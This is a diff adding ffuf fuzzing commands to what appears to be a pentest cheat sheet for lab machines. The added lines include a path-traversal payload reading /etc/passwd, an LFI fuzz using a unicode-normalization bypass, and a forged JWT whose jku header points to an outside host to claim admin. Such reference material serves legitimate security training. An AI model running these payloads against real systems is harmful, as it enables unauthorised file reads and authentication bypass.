@@ -1357,6 +1357,14 @@ ffuf.output = """[*] Virtual Host Discovery (without DNS records)
 
 # Filter out response and FUZZ Hosts
 > ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://site.com -H "Host: FUZZ.site.com" -t 500 -fs 612
+
+
+# Fuzz PARAMETERS
+ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://10.10.11.135/image.php?FUZZ=../../../../../../../etc/passwd -H 'Cookie: PHPSESSID=or9gre2aitmqg3r2ndr9m3st3o' -t 10 -r -fs 0
+
+
+# LFI with cookie example and unicode normalization vulnerability (‥ not ..):
+ffuf -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -u http://hackmedia.htb/display/?page=‥/‥/‥/‥/‥/‥/‥/‥/‥/‥/‥/FUZZ -b 'auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE0LjIzMC9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.MKk27s1SX8G_iV74wwPA-iuRdCY0MtOb4RCgJ-aTDSQ9O39pj5UR4AsVsRynD9tFWdLKkg_9GkfHPWo5iUg46xalvSvo7SVRs8i67Ny_DDhxoiTSJpGNqUaCMefeNQItvfO_r7Jw6yh7VG3LGKfgzZC9HW1rUJfnaNLlXhNHQpqejpPvlNnx0_iMF-SEuuF1U-kjL7NMGtaDmMdBIEFK7QTChg5-KnxrLZoyTtYa92aTrpCm7BzD7Cr4Qpuv9ITJSdLgXRKo6xlSptmRAhfblWIU1Of0VuyGIrehaPcJJHj-yuXh1HnFwCwF2NPreGpj5XVwkqDuLRhk8tmYFnlCiA' -mc 200 -fw 1299
 """
 
 ######################################
